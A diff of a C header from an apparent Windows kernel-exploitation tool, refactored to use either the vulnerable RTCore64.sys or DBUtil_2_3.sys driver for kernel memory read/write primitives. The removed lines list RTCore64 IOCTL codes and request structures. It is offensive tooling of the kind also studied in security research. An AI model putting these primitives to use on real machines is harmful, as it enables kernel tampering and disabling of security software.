@@ -9,61 +9,49 @@
 
 #include <Windows.h>
 
+#define RTCore 0
+#define DBUtil 1
+#define VULN_DRIVER RTCore
 
-struct RTCORE64_MSR_READ {
-    DWORD Register;
-    DWORD ValueHigh;
-    DWORD ValueLow;
-};
+#if VULN_DRIVER == RTCore
+#define DEFAULT_DRIVER_FILE TEXT("RTCore64.sys")
+#define GetDriverHandle GetDriverHandle_RTCore
+#define CloseDriverHandle CloseDriverHandle_RTCore
+#define ReadMemoryPrimitive ReadMemoryPrimitive_RTCore
+#define WriteMemoryPrimitive WriteMemoryPrimitive_RTCore
+#elif VULN_DRIVER == DBUtil
+#define DEFAULT_DRIVER_FILE TEXT("DBUtil_2_3.sys")
+#define GetDriverHandle GetDriverHandle_DBUtil
+#define CloseDriverHandle CloseDriverHandle_DBUtil
+#define ReadMemoryPrimitive ReadMemoryPrimitive_DBUtil
+#define WriteMemoryPrimitive WriteMemoryPrimitive_DBUtil
+#endif
 
-struct RTCORE64_MEMORY_READ {
-    BYTE Pad0[8];
-    DWORD64 Address;
-    BYTE Pad1[8];
-    DWORD ReadSize;
-    DWORD Value;
-    BYTE Pad3[16];
-};
 
-struct RTCORE64_MEMORY_WRITE {
-    BYTE Pad0[8];
-    DWORD64 Address;
-    BYTE Pad1[8];
-    DWORD ReadSize;
-    DWORD Value;
-    BYTE Pad3[16];
-};
+BYTE    ReadMemoryBYTE(DWORD64 Address);
+WORD    ReadMemoryWORD(DWORD64 Address);
+DWORD   ReadMemoryDWORD(DWORD64 Address);
+DWORD64 ReadMemoryDWORD64(DWORD64 Address);
 
-static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
-static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
-static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
+BYTE    ReadKernelMemoryBYTE(DWORD64 Offset);
+WORD    ReadKernelMemoryWORD(DWORD64 Offset);
+DWORD   ReadKernelMemoryDWORD(DWORD64 Offset);
+DWORD64 ReadKernelMemoryDWORD64(DWORD64 Offset);
 
-BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address);
+VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);
 
-WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address);
+void WriteMemoryBYTE(DWORD64 Address, BYTE Value);
+void WriteMemoryWORD(DWORD64 Address, WORD Value);
+void WriteMemoryDWORD(DWORD64 Address, DWORD Value);
+void WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);
 
-DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address);
+void WriteKernelMemoryBYTE(DWORD64 Offset, BYTE Value);
+void WriteKernelMemoryWORD(DWORD64 Offset, WORD Value);
+void WriteKernelMemoryDWORD(DWORD64 Offset, DWORD Value);
+void WriteKernelMemoryDWORD64(DWORD64 Offset, DWORD64 Value);
 
-DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address);
+VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);
 
-void WriteMemoryBYTE(HANDLE Device, DWORD64 Address, DWORD64 Value);
+VOID CloseDriverHandle();
 
-void WriteMemoryWORD(HANDLE Device, DWORD64 Address, DWORD64 Value);
-
-void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value);
-
-/*
-
---- Kernel exploitation helpers.
---- Largely inspired from https://github.com/br-sn/CheekyBlinder
---- Source and credit: https://github.com/br-sn/CheekyBlinder/blob/master/CheekyBlinder/CheekyBlinder.cpp
-
-*/
-
-DWORD64 FindNtoskrnlBaseAddress(void);
-
-TCHAR* FindDriver(DWORD64 address, BOOL verbose);
-
-HANDLE GetDriverHandle();
-
-DWORD64 GetFunctionAddress(LPCSTR function);
+BOOL TestReadPrimitive();
